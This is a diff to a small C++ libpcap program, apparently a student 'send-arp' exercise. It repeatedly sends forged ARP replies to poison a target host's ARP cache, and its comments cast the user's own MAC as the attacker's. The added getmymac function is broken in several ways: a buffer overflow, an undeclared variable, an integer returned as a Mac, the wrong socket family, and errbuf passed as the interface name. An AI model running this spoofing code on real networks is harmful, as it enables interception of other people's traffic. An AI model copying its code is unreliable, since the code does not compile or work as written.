@@ -1,6 +1,9 @@
 #include <cstdio>
 #include <pcap.h>
 #include <unistd.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
 #include "ethhdr.h"
 #include "arphdr.h"
 
@@ -16,8 +19,30 @@ void usage() {
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-Mac getmymac(){
+Mac getmymac(char* dev){
+	int sock;
+	struct ifreq ifr;
+	char buf[6];
+	memset(&ifr, 0x00, sizeof(ifr));
+    strcpy(ifr.ifr_name, dev);
 
+    int fd=socket(AF_UNIX, SOCK_DGRAM, 0);
+
+    if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0){
+        perror("socket ");
+        return 1;
+    }
+
+    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
+        perror("ioctl ");
+        return 1;
+    }
+    mac = ifr.ifr_hwaddr.sa_data;
+	sprintf(buf,"%02x%02x%02x%02x%02x%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
+	Mac mymac=Mac(buf);
+	printf("%s\n",mymac);
+    close(sock);
+	return mymac;
 }
 
 Mac getsendermac(Ip sip){
@@ -42,7 +67,7 @@ int main(int argc, char* argv[]) {
 
 	EthArpPacket packet;
 	Mac smac=getsendermac(senderip);
-	Mac mmac=getmymac();
+	Mac mmac=getmymac(errbuf);
 	packet.eth_.dmac_ = smac;//mac of sender
 	packet.eth_.smac_ = mmac;//mac of mine(attacker)
 	packet.eth_.type_ = htons(EthHdr::Arp);
@@ -57,7 +82,7 @@ int main(int argc, char* argv[]) {
 	packet.arp_.tmac_ = smac;//mac of sender
 	packet.arp_.tip_ = htonl(senderip);//ip of sender
 	while(1){
-		printf(".\n");
+		printf("sending arp!!...\n");
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
